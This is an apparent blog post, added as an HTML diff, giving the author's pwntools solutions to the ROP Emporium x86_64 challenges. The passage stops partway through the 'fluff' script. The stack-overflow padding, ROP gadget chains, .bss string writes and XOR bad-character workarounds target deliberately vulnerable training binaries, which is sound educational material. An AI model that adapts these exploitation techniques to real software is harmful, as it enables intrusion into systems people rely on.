@@ -1,0 +1,469 @@
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#faf7f2"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="icon" href="/favicon.ico"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Shuban Pal" href="https://example.com/rss.xml"><meta name="generator" content="Astro v6.3.7"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap"><!-- Canonical URL --><link rel="canonical" href="https://example.com/blog/first-post/"><!-- Primary Meta Tags --><title>ROP Emporium</title><meta name="title" content="ROP Emporium"><meta name="description" content="My solutions for all x86_64 binary exploitation puzzles"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://example.com/blog/first-post/"><meta property="og:title" content="ROP Emporium"><meta property="og:description" content="My solutions for all x86_64 binary exploitation puzzles"><meta property="og:image" content="https://example.com/_astro/blog-placeholder-1.Bx0Zcyzv.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://example.com/blog/first-post/"><meta property="twitter:title" content="ROP Emporium"><meta property="twitter:description" content="My solutions for all x86_64 binary exploitation puzzles"><meta property="twitter:image" content="https://example.com/_astro/blog-placeholder-1.Bx0Zcyzv.jpg"><link rel="stylesheet" href="/_astro/SiteLayout.DEQPrGj9.css"></head> <body class> <div class="site-background" aria-hidden="true" data-astro-transition-persist="astro-srsektdn-1"> <div class="site-background__wash"></div> <canvas class="site-background__canvas"></canvas> </div> <div class="page-frame"> <header class="site-header"> <nav class="nav-panel panel" aria-label="Primary"> <a class="brand-lockup" href="/"> <span class="brand-title">Shuban Pal</span> </a> <div class="nav-links"> <a href="/"> Home </a><a href="/blog" class="active"> Blog </a> </div> </nav> </header> <main class="page-content">  <article class="article-shell"> <section class="article-hero panel"> <div class="article-hero__copy"> <p class="eyebrow">BLOG POST</p> <div class="tag-row"> <span class="tag-chip" style="--tag-bg: #eef8ff; --tag-border: #8fbfe5; --tag-text: #245b7d;"> Binary Exploitation </span> </div> <h1>ROP Emporium</h1> <p class="article-description">My solutions for all x86_64 binary exploitation puzzles</p> </div> <div class="article-hero__stats"> <div class="article-stat"> <span>Published</span> <strong><time datetime="2026-05-18T00:00:00.000Z"> May 17, 2026 </time></strong> </div> <div class="article-stat"> <span>Updated</span> <strong><time datetime="2026-05-20T00:00:00.000Z"> May 19, 2026 </time></strong> </div> <div class="article-stat"> <span>Format</span> <strong>Markdown route</strong> </div> </div> </section> <section class="article-panel panel"> <div class="article-prose">  <h2 id="chall-1-ret2win">Chall 1: ret2win</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./ret2win'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'A'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">32</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'B'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">8</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">000000000040053e</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400756</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(payload)</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h2 id="chall-2-split">Chall 2: split</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#6A737D">#!/usr/bin/python3</span></span>
+<span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"><span style="color:#24292E">context.arch </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'amd64'</span></span>
+<span class="line"><span style="color:#24292E">context.os </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'linux'</span></span>
+<span class="line"><span style="color:#24292E">context.bits </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 64</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">"./split"</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#005CC5">print</span><span style="color:#24292E">(</span><span style="color:#032F62">"connect gdb to pid </span><span style="color:#005CC5">%d</span><span style="color:#032F62">"</span><span style="color:#D73A49"> %</span><span style="color:#24292E"> io.pid)</span></span>
+<span class="line"><span style="color:#24292E">pause()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'A'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">32</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'B'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">8</span></span>
+<span class="line"><span style="color:#24292E">cat_virtual_address </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">1060</span><span style="color:#D73A49"> -</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">1050</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">601050</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">pop_rdi </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">000000004007c3</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">system_plt </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">000000000040074b</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rdi </span><span style="color:#D73A49">+</span><span style="color:#24292E"> cat_virtual_address </span><span style="color:#D73A49">+</span><span style="color:#24292E"> system_plt</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(payload)</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span>
+<span class="line"></span></code></pre>
+<h2 id="chall-3-callme">Chall 3: callme</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"><span style="color:#24292E">context.bits </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 64</span></span>
+<span class="line"><span style="color:#24292E">context.os </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'linux'</span></span>
+<span class="line"><span style="color:#24292E">context.arch </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'amd64'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">debug </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> False</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./callme'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">if</span><span style="color:#24292E"> debug:</span></span>
+<span class="line"><span style="color:#005CC5">    print</span><span style="color:#24292E">(</span><span style="color:#032F62">"pid for process @ </span><span style="color:#005CC5">%d</span><span style="color:#032F62">"</span><span style="color:#D73A49"> %</span><span style="color:#24292E"> io.pid)</span></span>
+<span class="line"><span style="color:#24292E">    pause()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">arg1 </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">deadbeefdeadbeef</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">arg2 </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">cafebabecafebabe</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">arg3 </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">d00df00dd00df00d</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">args </span><span style="color:#D73A49">=</span><span style="color:#24292E"> arg1 </span><span style="color:#D73A49">+</span><span style="color:#24292E"> arg2 </span><span style="color:#D73A49">+</span><span style="color:#24292E"> arg3</span></span>
+<span class="line"><span style="color:#24292E">junk </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'A'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 32</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'B'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 8</span></span>
+<span class="line"><span style="color:#24292E">one </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">400720</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">two </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">400740</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">three </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">4006f0</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">gadget </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">40093c</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">=</span><span style="color:#24292E"> junk </span><span style="color:#D73A49">+</span><span style="color:#24292E"> gadget </span><span style="color:#D73A49">+</span><span style="color:#24292E"> args </span><span style="color:#D73A49">+</span><span style="color:#24292E"> one</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> gadget </span><span style="color:#D73A49">+</span><span style="color:#24292E"> args </span><span style="color:#D73A49">+</span><span style="color:#24292E"> two</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> gadget </span><span style="color:#D73A49">+</span><span style="color:#24292E"> args </span><span style="color:#D73A49">+</span><span style="color:#24292E"> three</span></span>
+<span class="line"><span style="color:#24292E">io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'> '</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(payload)</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h2 id="chall-4-write4">Chall 4: write4</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./write4'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">pop_rdi </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400693</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">pop_r14_r15 </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400690</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">mov_qword_ptr </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400628</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">print_file_call </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400620</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">flag_file </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">7478742e67616c66</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">reserved_addr_bss </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000601038</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'A'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 32</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'B'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 8</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Write "flag.txt" to bss</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_r14_r15</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> reserved_addr_bss </span><span style="color:#6A737D"># address -> r14</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> flag_file </span><span style="color:#6A737D"># flag.txt -> r15</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> mov_qword_ptr </span><span style="color:#6A737D"># mov qword ptr [r14], r15 ; ret</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># use pop_rdi to set argument, and shove "flag.txt" into printfile call</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rdi</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> reserved_addr_bss</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> print_file_call</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.sendline(payload)</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h2 id="chall-5-badchars">Chall 5: badchars</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./badchars'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">debug </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> False</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">if</span><span style="color:#24292E"> debug:</span></span>
+<span class="line"><span style="color:#005CC5">    print</span><span style="color:#24292E">(</span><span style="color:#032F62">"gdb &#x3C;bin> -q &#x3C;pid> @ </span><span style="color:#005CC5">%d</span><span style="color:#032F62">"</span><span style="color:#D73A49"> %</span><span style="color:#24292E"> io.pid)</span></span>
+<span class="line"><span style="color:#24292E">    pause()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">badchars </span><span style="color:#D73A49">=</span><span style="color:#24292E"> [</span><span style="color:#D73A49">b</span><span style="color:#032F62">'x'</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'g'</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'a'</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'.'</span><span style="color:#24292E">]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">pop_rdi </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004006a3</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">xor </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400628</span><span style="color:#24292E">)  </span><span style="color:#6A737D"># xor byte ptr [r15], r14b ; ret</span></span>
+<span class="line"><span style="color:#24292E">pop_r12_r13_r14_r15 </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">000000000040069c</span><span style="color:#24292E">) </span><span style="color:#6A737D"># pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span>
+<span class="line"><span style="color:#24292E">pop_r14_r15 </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004006a0</span><span style="color:#24292E">) </span><span style="color:#6A737D"># pop r14 ; pop r15 ; ret</span></span>
+<span class="line"><span style="color:#24292E">mov_qword_ptr </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400634</span><span style="color:#24292E">) </span><span style="color:#6A737D"># mov qword ptr [r13], r12 ; ret</span></span>
+<span class="line"><span style="color:#24292E">print_file_call </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400620</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">xor_byte </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">3</span></span>
+<span class="line"><span style="color:#24292E">flag_str </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">"flag.txt"</span></span>
+<span class="line"><span style="color:#24292E">flag_file_xor </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> bytes</span><span style="color:#24292E">([b </span><span style="color:#D73A49">^</span><span style="color:#24292E"> xor_byte </span><span style="color:#D73A49">for</span><span style="color:#24292E"> b </span><span style="color:#D73A49">in</span><span style="color:#24292E"> flag_str])  </span><span style="color:#6A737D"># xored</span></span>
+<span class="line"><span style="color:#24292E">reserved_addr_data </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">000000000601030</span><span style="color:#6A737D">  # reserved data addr, free space</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'A'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">32</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'B'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">8</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_r12_r13_r14_r15</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> flag_file_xor</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(reserved_addr_data)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(xor_byte)  </span><span style="color:#6A737D"># r14; temp junk</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(reserved_addr_data)  </span><span style="color:#6A737D"># r15; temp junk</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> mov_qword_ptr</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">for</span><span style="color:#24292E"> i </span><span style="color:#D73A49">in</span><span style="color:#005CC5"> range</span><span style="color:#24292E">(</span><span style="color:#005CC5">0</span><span style="color:#24292E">, </span><span style="color:#005CC5">8</span><span style="color:#24292E">):</span></span>
+<span class="line"><span style="color:#24292E">    payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_r14_r15</span></span>
+<span class="line"><span style="color:#24292E">    payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(xor_byte) </span><span style="color:#6A737D"># xor byte -> r14</span></span>
+<span class="line"><span style="color:#24292E">    payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(reserved_addr_data </span><span style="color:#D73A49">+</span><span style="color:#24292E"> i) </span><span style="color:#6A737D"># byte addr -> r15</span></span>
+<span class="line"><span style="color:#24292E">    payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> xor</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rdi</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(reserved_addr_data)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> print_file_call</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Send and interact</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(payload)</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h2 id="chall-6-fluff">Chall 6: fluff</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#6A737D">#!/usr/bin/python3</span></span>
+<span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./fluff'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">"""</span></span>
+<span class="line"><span style="color:#032F62">Dump of assembler code for function questionableGadgets:</span></span>
+<span class="line"><span style="color:#032F62">   0x0000000000400628 &#x3C;+0>:     xlat   BYTE PTR ds:[rbx]</span></span>
+<span class="line"><span style="color:#032F62">   0x0000000000400629 &#x3C;+1>:     ret</span></span>
+<span class="line"><span style="color:#032F62">   0x000000000040062a &#x3C;+2>:     pop    rdx</span></span>
+<span class="line"><span style="color:#032F62">   0x000000000040062b &#x3C;+3>:     pop    rcx</span></span>
+<span class="line"><span style="color:#032F62">   0x000000000040062c &#x3C;+4>:     add    rcx,0x3ef2</span></span>
+<span class="line"><span style="color:#032F62">   0x0000000000400633 &#x3C;+11>:    bextr  rbx,rcx,rdx</span></span>
+<span class="line"><span style="color:#032F62">   0x0000000000400638 &#x3C;+16>:    ret</span></span>
+<span class="line"><span style="color:#032F62">   0x0000000000400639 &#x3C;+17>:    stos   BYTE PTR es:[rdi],al</span></span>
+<span class="line"><span style="color:#032F62">   0x000000000040063a &#x3C;+18>:    ret</span></span>
+<span class="line"><span style="color:#032F62">   0x000000000040063b &#x3C;+19>:    nop    DWORD PTR [rax+rax*1+0x0]</span></span>
+<span class="line"><span style="color:#032F62">"""</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">"""</span></span>
+<span class="line"><span style="color:#032F62">xlat maps input bytes via lookup table</span></span>
+<span class="line"><span style="color:#032F62">"""</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">"""</span></span>
+<span class="line"><span style="color:#032F62">bextr extracts bits from rcx into rbx, rdx specifies the start bit and length via bitmask.</span></span>
+<span class="line"><span style="color:#032F62">"""</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">"""</span></span>
+<span class="line"><span style="color:#032F62">stos   BYTE PTR es:[rdi],al stores al into memory at address in rdi</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">We need pop rdi to pair this with as well as some gadgets concerning rbx and rcx to connect bextr and xlat in order to control al.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">Once al is controlled, we have full control over rdi so it should be easy from there.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">We know that we will need to use stos to write the bytes to bss. </span></span>
+<span class="line"><span style="color:#032F62">"""</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">add_al_bpl </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">000000000040061e</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">pop_rbp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400588</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">pop_rdi </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004006a3</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">print_file_call </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400620</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">xlatb_ret </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400628</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">bextr_gadget </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">000000000040062a</span><span style="color:#24292E">)  </span><span style="color:#6A737D"># single gadget: pop rdx; pop rcx; add rcx, 0x3ef2; bextr; ret</span></span>
+<span class="line"><span style="color:#24292E">flag_file </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">"flag.txt"</span></span>
+<span class="line"><span style="color:#24292E">reserved_addr_bss </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">0000000000601038</span></span>
+<span class="line"><span style="color:#24292E">stos </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400639</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">initial_rax </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">b</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># char addresses found by usual offsets after 0x4000000</span></span>
+<span class="line"><span style="color:#24292E">char_addrs </span><span style="color:#D73A49">=</span><span style="color:#24292E"> [</span></span>
+<span class="line"><span style="color:#D73A49">    0x</span><span style="color:#005CC5">4003c4</span><span style="color:#24292E">,  </span><span style="color:#6A737D"># 'f'</span></span>
+<span class="line"><span style="color:#D73A49">    0x</span><span style="color:#005CC5">400239</span><span style="color:#24292E">,  </span><span style="color:#6A737D"># 'l'</span></span>
+<span class="line"><span style="color:#D73A49">    0x</span><span style="color:#005CC5">4003d6</span><span style="color:#24292E">,  </span><span style="color:#6A737D"># 'a'</span></span>
+<span class="line"><span style="color:#D73A49">    0x</span><span style="color:#005CC5">4003cf</span><span style="color:#24292E">,  </span><span style="color:#6A737D"># 'g'</span></span>
+<span class="line"><span style="color:#D73A49">    0x</span><span style="color:#005CC5">40024e</span><span style="color:#24292E">,  </span><span style="color:#6A737D"># '.'</span></span>
+<span class="line"><span style="color:#D73A49">    0x</span><span style="color:#005CC5">400192</span><span style="color:#24292E">,  </span><span style="color:#6A737D"># 't'</span></span>
+<span class="line"><span style="color:#D73A49">    0x</span><span style="color:#005CC5">400246</span><span style="color:#24292E">,  </span><span style="color:#6A737D"># 'x'</span></span>
+<span class="line"><span style="color:#D73A49">    0x</span><span style="color:#005CC5">400192</span><span style="color:#24292E">,  </span><span style="color:#6A737D"># 't' again</span></span>
+<span class="line"><span style="color:#24292E">]</span></span>
+<span class="line"></span>
